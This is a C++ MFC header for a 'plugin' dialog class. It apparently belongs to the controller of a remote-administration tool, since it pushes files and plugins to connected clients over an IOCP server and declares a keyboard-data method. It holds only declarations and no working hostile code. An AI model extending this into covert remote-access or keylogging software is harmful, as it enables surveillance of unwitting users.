#if !defined(AFX_PLUGINDLG_H__1DDEE83C_12F2_4D0B_8767_85FEE5B2E938__INCLUDED_)
#define AFX_PLUGINDLG_H__1DDEE83C_12F2_4D0B_8767_85FEE5B2E938__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// PluginDlg.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CPluginDlg dialog

class CPluginDlg : public CDialog
{
	// Construction
public:
	void SendFile();
	CHAR szSendPath[MAX_PATH];
	static DWORD WINAPI SendFileThread(LPVOID lParam);

	void OnReceiveComplete();
	CPluginDlg(CWnd* pParent = NULL, CIOCPServer* pIOCPServer = NULL, ClientContext *pContext = NULL);   // standard constructor
	// Dialog Data
	//{{AFX_DATA(CPluginDlg)
	enum { IDD = IDD_PLUGIN_DIALOG };
	CProgressCtrl	m_Show;
	CListCtrl	m_List;
	CEdit	m_edit;
	//}}AFX_DATA
	
	// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CPluginDlg)
public:
protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL
	
	// Implementation
protected:
	
	// Generated message map functions
	//{{AFX_MSG(CPluginDlg)
	virtual BOOL OnInitDialog();
	afx_msg void OnClose();
	afx_msg void OnDropFiles(HDROP hDropInfo);
	afx_msg void OnRclickList1(NMHDR* pNMHDR, LRESULT* pResult);
	afx_msg void OnPluginDelete();
	afx_msg void OnPluginEnd();
	afx_msg void OnPluginStart();
	afx_msg void OnRefurbish();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
private:
	HICON m_hIcon;
	ClientContext* m_pContext;
	CIOCPServer* m_iocpServer;
	UINT m_nCurSel;
	UINT m_nReceiveLength;
	void AddKeyBoardData();
	void ResizeEdit();
};


//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_PLUGINDLG_H__1DDEE83C_12F2_4D0B_8767_85FEE5B2E938__INCLUDED_)
